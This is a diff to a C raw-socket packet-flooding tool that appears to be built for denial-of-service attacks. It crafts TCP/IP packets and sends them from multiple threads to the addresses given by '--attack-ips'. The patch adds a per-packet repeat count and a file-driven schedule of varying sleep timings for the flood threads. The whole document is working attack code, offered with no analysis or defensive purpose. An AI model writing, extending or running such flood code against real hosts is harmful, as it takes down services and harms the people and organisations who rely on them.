@@ -22,7 +22,11 @@ struct thread_data {
 	struct sockaddr_in sin;
 	char* attack_ips;
 	int single;
+	int copies;
 	int attack_sleep;
+	int *attack_sleep_timings;
+	int attack_sleep_timings_cnt;
+	int attack_sleep_timings_size;
 };
 
 void init_rand(uint32_t x) {
@@ -51,7 +55,7 @@ uint32_t rand_cmwc(void) {
 	return (Q[i] = r - x);
 }
 
-/* function for header checksums */
+// function for header checksums
 unsigned short csum (unsigned short *buf, int nwords) {
 	unsigned long sum;
 	for (sum = 0; nwords > 0; nwords--) {
@@ -249,16 +253,19 @@ void *flood(void *par1) {
 		tcph->check = tcp_csum( iph, (void*)tcph, sizeof(struct tcphdr) );
 		// printf("tcph->check2: %0X\n", tcph->check);
 		iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
-		for(i=0; i<1; i++) {
+		
+		for(i=0; i<td->copies; i++) {
 			sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
 		}
 		
 		if(td->single) {
 			return 0;
+		} else if(td->attack_sleep_timings) {
+			usleep(td->attack_sleep_timings[td->attack_sleep_timings_cnt]);
+			td->attack_sleep_timings_cnt = (td->attack_sleep_timings_cnt + 1) % td->attack_sleep_timings_size;
+		} else {
+			usleep(td->attack_sleep);
 		}
-		// usleep(10000);
-		usleep(td->attack_sleep);
-		// break;
 	}
 }
 int main(int argc, char *argv[ ]) {
@@ -285,6 +292,10 @@ int main(int argc, char *argv[ ]) {
 	int single = 0;
 	int nsleep = 0;
 	int attack_sleep = 1000;
+	
+	int *attack_sleep_timings = 0;
+	int attack_sleep_timings_size = 0;
+	
 	for(i=0; i < argc; i++) {
 		if (*argv[i] == '-') {
 			if(!strcmp(argv[i], "--attack-ips")) {
@@ -301,6 +312,17 @@ int main(int argc, char *argv[ ]) {
 				nsleep = atoi(argv[++i]);
 			} else if(!strcmp(argv[i], "--attack-sleep")) {
 				attack_sleep = atoi(argv[++i]);
+			} else if(!strcmp(argv[i], "--attack-sleep-timings")) {
+				attack_sleep = atoi(argv[++i]);
+				FILE* f = fopen(argv[++i], "r");
+				int c = 0, cnt = 0;
+				while(fscanf(f, "%d", &c) != EOF) cnt++;
+				fseek(f, 0, SEEK_SET);
+				c = 0;
+				attack_sleep_timings = malloc(cnt*sizeof(int));
+				while(fscanf(f, "%d", &attack_sleep_timings[c++]) != EOF);
+				attack_sleep_timings_size = cnt;
+				fclose(f);
 			}
 		}
 	}
@@ -323,7 +345,11 @@ int main(int argc, char *argv[ ]) {
 		td[i].floodport = floodport;
 		td[i].attack_ips = attack_ips;
 		td[i].single = single;
+		td[i].copies = 1;
 		td[i].attack_sleep = attack_sleep;
+		td[i].attack_sleep_timings = attack_sleep_timings;
+		td[i].attack_sleep_timings_cnt = 0;
+		td[i].attack_sleep_timings_size = attack_sleep_timings_size;
 		pthread_create( &thread[i], NULL, &flood, (void *) &td[i]);
 		if(single) {
 			pthread_join(thread[i],0);
